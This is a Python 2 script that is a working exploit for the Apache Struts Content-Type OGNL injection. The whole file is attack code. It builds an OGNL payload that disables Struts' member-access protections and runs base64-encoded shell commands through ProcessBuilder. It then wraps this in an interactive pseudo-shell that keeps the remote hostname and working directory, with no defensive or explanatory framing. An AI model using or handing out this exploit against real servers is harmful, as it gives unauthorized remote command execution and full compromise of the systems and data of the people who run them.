#!/bin/python2

import base64
import requests
import sys

# hack for struts-pwn
RetryOnChunkedEncodingEnabled = True

def print_non_empty(msg):
    if len(msg) > 0:
        print msg,

def format_cmd(cmd):
    return 'echo %s | base64 -d | /bin/bash' % base64.b64encode(cmd)
    

def rce(url, cmd, timeout=3):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % format_cmd(cmd)
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"

    headers = {
        'Content-Type': str(payload),
        'Accept': '*/*'
    }

    try:
        output = requests.get(url, headers=headers, verify=False, timeout=timeout, allow_redirects=False).text
    
    except requests.exceptions.ChunkedEncodingError:
        #print("[!] ChunkedEncodingError Error: Making another request to the url.")
        #print("Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.")
        if not RetryOnChunkedEncodingEnabled:
            return b""

        try:
            output = b""
            with requests.get(url, headers=headers, verify=False, timeout=timeout, allow_redirects=False, stream=True) as resp:
                for i in resp.iter_content():
                    output += i
        except requests.exceptions.ChunkedEncodingError: pass
        except Exception as e:
            print("EXCEPTION::::--> " + str(e))
            output = 'ERROR'
        if type(output) != str:
            output = output.decode('utf-8')
        return output
    except requests.exceptions.Timeout:
        output = b""
    except Exception as e:
        print("EXCEPTION::::--> " + str(e))
        output = 'ERROR'
    
    return output



url = sys.argv[1]
HOST = rce(url, "hostname").rstrip()
PWD = rce(url, "pwd").rstrip()

while True:
    cmd = raw_input("%s:%s$ " % (HOST, PWD))

    if cmd == "exit":
        sys.exit(0)
    elif cmd[:3] == "cd ":
        prepared_cmd = "cd %s && %s ; pwd" % (PWD, cmd)
        PWD = rce(url, prepared_cmd).rstrip()
    elif cmd == "l" or cmd[:2] == "l ":
        prepared_cmd = "cd %s && ls -al %s" % (PWD, cmd[2:])
        print_non_empty(rce(url, prepared_cmd))
    else:
        prepared_cmd = "cd %s && %s" % (PWD, cmd)
        print_non_empty(rce(url, prepared_cmd))
